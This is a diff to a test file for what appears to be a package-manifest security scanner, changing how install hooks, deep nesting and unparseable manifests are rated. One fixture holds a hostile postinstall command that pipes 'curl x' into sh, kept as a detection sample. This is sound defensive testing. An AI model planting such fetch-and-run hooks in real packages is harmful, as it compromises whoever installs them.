@@ -42,10 +42,13 @@ test("jsonRenderer emits generatedBy as the literal first key", () => {
 });
 
 test("supply chain: any lifecycle script → SC-INSTALL-HOOK MAJOR; fetch/eval → CRITICAL", () => {
-  const benign = JSON.stringify({ scripts: { prepare: "mkdir dist" } });
-  const [a] = scanManifest("package.json", benign);
+  // spec 3: a non-suspicious prepare-family hook of a checked-out project is
+  // INFO (it runs for the developer's own `npm install`); install hooks stay MAJOR
+  const benign = JSON.stringify({ scripts: { prepare: "mkdir dist", postinstall: "node x.js" } });
+  const [a, p] = scanManifest("package.json", benign);
   assert.equal(a.rule, "SC-INSTALL-HOOK");
   assert.equal(a.sev, "MAJOR");
+  assert.equal(p.sev, "INFO");
 
   const evil = JSON.stringify({ scripts: { postinstall: "node -e 'require(\"child_process\").exec(\"curl x|sh\")'" } });
   const [b] = scanManifest("package.json", evil);
@@ -68,18 +71,21 @@ test("supply chain: binding.gyp actions flagged, gyp file in repo fixture detect
   assert.equal(b.sev, "MAJOR");
 });
 
-test("supply chain: hostile deep manifest parses or errors cleanly — never a crash", () => {
-  // V8's JSON.parse is iterative (no RecursionError equivalent). Depth is
-  // hostile input, not an attack on THIS engine: whatever it does — parse,
-  // SyntaxError — the scanner returns issues (possibly none) and never throws.
+test("supply chain: hostile deep manifest is SC-MANIFEST-DEPTH — never a crash, never silent", () => {
+  // V8's JSON.parse is iterative (no RecursionError equivalent), so the depth
+  // is checked before parsing, like the Python engine's recursion limit.
   const deep = '{"a":'.repeat(50000) + "1" + "}".repeat(50000);
   const out = scanManifest("package.json", deep);
-  assert.ok(Array.isArray(out));
-  // invalid JSON (not depth): no issues, not a crash — the Python parity is
-  // "a normal parse error yields no findings"
-  assert.deepEqual(scanManifest("package.json", "{not json at all"), []);
-  assert.deepEqual(scanManifest("package.json", "null"), []);
-  assert.deepEqual(scanManifest("package.json", "[1,2,3]"), []);
+  assert.deepEqual(out.map((i) => [i.rule, i.sev]), [["SC-MANIFEST-DEPTH", "CRITICAL"]]);
+  // invalid JSON: the ROOT manifest of a project scan is a finding (spec 3);
+  // any other manifest yields nothing (this used to be [] for the root too)
+  assert.deepEqual(scanManifest("package.json", "{not json at all").map((i) => [i.rule, i.sev]),
+    [["SC-MANIFEST-UNPARSEABLE", "MAJOR"]]);
+  assert.deepEqual(scanManifest("sub/package.json", "{not json at all"), []);
+  // a root manifest whose top level is not an object is unparseable too
+  assert.deepEqual(scanManifest("package.json", "[1,2,3]").map((i) => i.msg),
+    ["package.json could not be parsed (top level is a list, not an object); its install hooks could not be checked."]);
+  assert.deepEqual(scanManifest("sub/package.json", "null"), []);
 });
 
 test("redaction: SECRET-rule flagged line replaced by deterministic placeholder", () => {
